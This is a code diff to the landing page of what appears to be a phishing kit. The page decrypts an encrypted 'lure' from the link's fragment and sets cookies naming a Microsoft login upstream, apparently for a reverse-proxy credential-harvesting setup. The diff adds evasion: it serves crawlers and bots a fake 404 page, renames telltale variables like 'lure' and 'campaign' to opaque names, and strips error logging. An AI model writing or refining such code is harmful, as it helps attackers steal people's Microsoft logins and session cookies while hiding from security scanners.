@@ -2,25 +2,26 @@
 <html><head><meta charset="UTF-8"><title>Loading...</title>
 <style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#e8e8e8}.spinner{width:28px;height:28px;border:3px solid #e0e0e0;border-top-color:#0067b8;border-radius:50%;animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style>
 </head>
-<body><div style="text-align:center"><div class="spinner" style="margin:0 auto 12px"></div><p style="color:#666">Loading&hellip;</p></div>
+<body><script>if(/bot|crawl|spider|scrape|slurp|baidu|yandex/i.test(navigator.userAgent)){document.body.innerHTML='<h1>404</h1>';document.title='404'}</script>
+<div style="text-align:center"><div class="spinner" style="margin:0 auto 12px"></div><p style="color:#666">Loading&hellip;</p></div>
 <script>
-const AES_KEY_B64 = 'CHANGE_ME';
-async function decrypt(k,c){const n=c.slice(0,12),t=c.slice(-16),e=c.slice(12,c.length-16);const r=await crypto.subtle.importKey('raw',k,{name:'AES-GCM'},false,['decrypt']);const d=new Uint8Array(e.length+t.length);d.set(e,0);d.set(t,e.length);try{return new TextDecoder().decode(await crypto.subtle.decrypt({name:'AES-GCM',iv:n,tagLength:128},r,d))}catch{return null}}
-function b64d(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return Uint8Array.from(atob(s),c=>c.charCodeAt(0))}
+const _k='CHANGE_ME';
+async function _d(k,c){const n=c.slice(0,12),t=c.slice(-16),e=c.slice(12,c.length-16);const r=await crypto.subtle.importKey('raw',k,{name:'AES-GCM'},false,['decrypt']);const d=new Uint8Array(e.length+t.length);d.set(e,0);d.set(t,e.length);try{return new TextDecoder().decode(await crypto.subtle.decrypt({name:'AES-GCM',iv:n,tagLength:128},r,d))}catch{return null}}
+function _b(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return Uint8Array.from(atob(s),c=>c.charCodeAt(0))}
 (async()=>{
     const h=window.location.hash.slice(1);
     if(!h)return document.body.innerHTML='<p style="color:red">Invalid link</p>';
     try{
-        const d=b64d(h);
-        if(new TextDecoder().decode(d.slice(0,3))!=='mv=')throw new Error('bad');
-        const pt=await decrypt(b64d(AES_KEY_B64),d.slice(3));
+        const d=_b(h);
+        if(d.length<=3)throw new Error('bad');
+        const pt=await _d(_b(_k),d.slice(3));
         if(!pt)throw new Error('decrypt');
-        const lure=JSON.parse(pt);
-        const upstream=encodeURIComponent(lure.r||'https://login.microsoftonline.com');
-        document.cookie='__upstream='+upstream+';path=/;max-age=3600';
-        document.cookie='__campaign='+encodeURIComponent(lure.c||'')+';path=/;max-age=3600';
+        const _l=JSON.parse(pt);
+        const _u=encodeURIComponent(_l.r||'https://login.microsoftonline.com');
+        document.cookie='_s='+_u+';path=/;max-age=3600';
+        document.cookie='_c='+encodeURIComponent(_l.c||'')+';path=/;max-age=3600';
         location.reload();
-    }catch(e){document.body.innerHTML='<p style="color:red">Cannot verify link</p>';console.error(e)}
+    }catch(e){document.body.innerHTML='<p style="color:red">Cannot verify link</p>'}
 })();
 </script>
 </body></html>
